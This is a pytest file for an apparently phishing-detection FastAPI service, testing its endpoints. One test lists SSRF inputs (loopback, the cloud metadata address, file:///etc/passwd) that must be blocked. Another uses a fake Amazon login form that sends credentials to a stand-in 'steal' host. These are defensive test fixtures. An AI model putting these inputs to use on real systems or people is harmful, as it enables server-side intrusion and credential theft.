import os
import sys
from fastapi.testclient import TestClient

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from backend.main import app


def test_health_version_model_info_analytics():
    with TestClient(app) as client:
        h = client.get("/health")
        assert h.status_code == 200
        assert h.json()["model_loaded"] is True

        v = client.get("/version")
        assert v.status_code == 200
        assert v.json()["api_version"] == "2.0.0"

        mi = client.get("/model-info")
        assert mi.status_code == 200
        assert mi.json()["url_feature_count"] >= 20

        an = client.get("/analytics")
        assert an.status_code == 200
        assert "total_scans" in an.json()


def test_ssrf_protection_blocks_private_loopback_metadata_and_bad_schemes():
    with TestClient(app) as client:
        blocked_urls = [
            "http://127.0.0.1:8000/health",
            "http://localhost:8000/",
            "http://169.254.169.254/latest/meta-data/",
            "http://10.0.0.1/admin",
            "file:///etc/passwd",
            "ftp://example.com/file",
            "http://user:pass@example.com/",
        ]
        for bad_url in blocked_urls:
            resp = client.post("/analyze-url", json={"url": bad_url, "fetch_live": False, "deep_scan": False})
            assert resp.status_code == 400, f"Expected SSRF block for {bad_url}, got {resp.status_code}"


def test_analyze_dom_and_website_with_synthetic_fixtures():
    with TestClient(app) as client:
        phish_html = """
        <html><head><title>Amazon Account Verify</title></head>
        <body><form method="post" action="https://credential-collector.example.org/steal">
        <input type="email" name="email"/><input type="password" name="pw"/>
        <button type="submit">Verify</button></form></body></html>
        """
        r = client.post("/analyze-website", json={
            "url": "https://amaz0n-verify-account.example.com/login",
            "html": phish_html,
            "fetch_live": False,
            "deep_scan": False,
        })
        assert r.status_code == 200
        data = r.json()
        assert data["overall_risk_level"] in ("HIGH", "CRITICAL")
        assert data["dimensions"]["credential_risk"]["level"] in ("HIGH", "CRITICAL")

        safe_html = """<!doctype html>
        <html lang="en">
        <head><meta charset="utf-8"><title>Aurora Goods Official Store</title></head>
        <body>
          <header><nav><a href="/">Home</a><a href="/about">About</a><a href="/contact">Contact</a></nav></header>
          <main>
            <h1>Welcome to Aurora Goods</h1>
            <p>Independent neighborhood retailer serving books and stationery since 2018.</p>
            <p>Customer support: support@auroragoods.org</p>
          </main>
          <footer><p>&copy; 2026 Aurora Goods. All rights reserved.</p></footer>
        </body>
        </html>"""
        r_safe = client.post("/analyze-dom", json={
            "url": "https://auroragoods.org/",
            "html": safe_html,
        })
        assert r_safe.status_code == 200
        assert r_safe.json()["overall_risk_level"] in ("LOW", "MEDIUM")


def test_predict_explain_and_feedback_endpoints():
    with TestClient(app) as client:
        pred = client.post("/predict", json={
            "url": "https://example.com/docs",
            "hostname": "example.com",
            "IsHTTPS": 1,
            "LineOfCode": 120,
            "HasTitle": 1,
            "DomainTitleMatchScore": 100.0,
        })
        assert pred.status_code == 200
        body = pred.json()
        assert "assessment" in body
        assert body["risk_level"] in ("LOW", "MEDIUM", "HIGH", "CRITICAL", "UNKNOWN")

        exp = client.post("/explain", json={
            "url": "https://example.com/docs",
            "hostname": "example.com",
            "is_phishing": False,
            "risk_level": "LOW",
            "phishing_probability": 0.05,
            "features": {"IsHTTPS": 1},
        })
        assert exp.status_code == 200
        assert len(exp.json()["explanation"]) > 10

        fb = client.post("/feedback", json={
            "url": "https://example.com/docs",
            "report_type": "false_positive",
            "notes": "Automated test feedback",
        })
        assert fb.status_code == 200
        assert fb.json()["verification_status"] == "pending_human_review"

